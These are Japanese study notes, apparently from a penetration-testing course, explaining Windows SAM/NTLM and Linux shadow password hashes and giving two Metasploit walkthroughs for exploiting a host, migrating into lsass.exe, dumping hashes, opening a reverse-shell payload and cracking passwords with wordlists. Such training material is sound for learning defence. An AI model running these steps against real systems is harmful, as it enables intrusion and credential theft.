Dumping & craking NTLM Hashes
・windowsOSはユーザアカウントのパスワードをハッシュ化して、ローカルのSAMデータベースに保存している
・ハッシュ化とは、データを別の値に変換するプロセスで、特定のアルゴリズムを用いて新しい値（ハッシュ化）を生成する。
この変換後の値をハッシュまたはハッシュ値という
・認証と資格情報の検証は、LSAによって処理される。
・Windows Server 2003までのバージョンでは、以下の2種類のハッシュ形式を使用している。
1) LM
2) NTLM

・SAM(security account manager)は、Windows上でユーザーアカウントとパスワードを管理する役割を持つデータベースファイルを持つデータベースファイル
SAMデータベースに保存される全てのユーザーアカウントのパスワードはハッシュ化されている。
・SAMデータベースファイルは、OSが稼働中はコピーできない
・Windows NTカーネルはSAMデータベースファイルをロックしており、その結果、攻撃者は通常、LSASSプロセスからSAMハッシュをダンプするためにインメモリの手法やツールを使用する
・最新のWindowsでは、SAMデータベースは、syskeyで暗号化される

・NTLMは、Windowsでコンピュータ間の認証を行うために、利用される一連の認証プロトコル
認証プロセスには、有効なユーザー名とパスワードを使用して正しく認証することが含まれる。
・Windows Vista以降、WindowsはLMハッシュを無効化し、NTLMハッシュを使用する
・ユーザーアカウントが作成されると元のパスコードは破棄され、MD4ハッシュアルゴリズムを用いて暗号化される
・NTLMは、以下の点でLMより改善される
1) ハッシュを2つのチャンクに分割しない
2) 大文字、小文字を区別する
3) 記号やunicode文字の使用を許可する

・次のような様々なユーティリティを利用することで、Windowsのパスコードハッシュをダンプできる
1) 組み込みのMeterpreter「hashdump」コマンド
2) Mimikatz
・ハッシュをダンプした後、次のようなユーティリティを使ってクラックできる。
1) join the ripper
2) hashcat

demo windows:NTLMハッシュクラッキング
1) pingでホストが稼働しているかを確認する
2) nmap -sV を使用して、セキュリティホールを探索する
3) 必要があれば、searchsploitでサービス名からローカルに脆弱性があるかを確認する
4) service postgresql start && msfconsole
5) search 脆弱性でモジュールの探索
6) use モジュール名で起動する
7) set　で情報を設定
8) exploit
9) 現在のプロセスを、migrate -N lsass.exeを使って、lsass.exeに移行する
10) hashdumpを使って、NTLMハッシュをダンプする
11) 以下のコマンドで、ハッシュがMSFデータベースに保存されているかを確認する
background
creds
12) 補助的なNTLMハッシュクラッキングモジュールを使用して、保存されているNTLMをクラッキングする
search crack_windows
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit

Linuxパスワードハッシュのダンプとクラッキング
・linuxはマルチユーザをサポートしており、その結果、複数のユーザーが同時にシステムへアクセスできる。
これはセキュリティの観点では、長所にも短所にもなる。
短所としては、複数のアカウントが存在することで、攻撃者に複数のアクセス経路を与えることになり、サーバ全体のリスクが増大する可能性がある。
・linux上のすべてのアカウント情報は、/etc/passwdにあるpasswdファイルに保存される
・passwdファイルには、ユーザーのパスワードが保存されているが、暗号化されているため、パスワードの確認はできない。
また、passwdファイルはシステム上のすべてのユーザが読み取り可能
・ユーザーの暗号化されたパスワードはshadowファイルに保存されている
shadowファイルは、/etc/shadowにある。
・shadowファイルはrootアカウントのみがアクセス、読み取りできる
これは他のアカウントがハッシュ化されたパスワードへアクセスすることを防ぐ、非常にセキュリティ上重要なセキュリティ機能

・shadowファイルは使用されていっるハッシュアルゴリズムやパスワードハッシュに関する情報を提供してくれる
そしてこれは、非常に有用で、どのハッシュアルゴリズムが使用されているのか、またその強度を判断できるため
・この情報は、ユーザ名の後にある$に囲まれた番号を見ることで判断できる
value      hash algorithm
$1        MD5
$2        Blowfish
$5        SHA-256
$6        SHA-512

・demo パスワードクラッカー：linux
1) pingでターゲットマシンの生存確認を行う
2) nmap -sS -sV でターゲットマシンのセキュリティホールを探索する
3) nmap --script vuln -p ポート番号 ターゲットドメインで脆弱性を探索
4) ターゲットマシンから取得したmetasploitの戦利品やその他の機密情報をすべて保存するためにpostgresqlを起動する
/etc/init.d/postgresql start
5) msfconsoleを起動して、モジュールを使用できるようにする。
msfconsole -q
use モジュール名
set payload payload/cmd/unix/reverse
set RHOSTS
set LHOST
exploit -z
6) exploit後、ハッシュダンプのモジュールを起動する
use post/linux/gather/hashdump
set SESSION 1
exploit
7) そして以下の補助モジュールを使って、rootユーザーのパスワードを見つける
use auxiliary/analyze/crack_linux
set SHA512 true
run
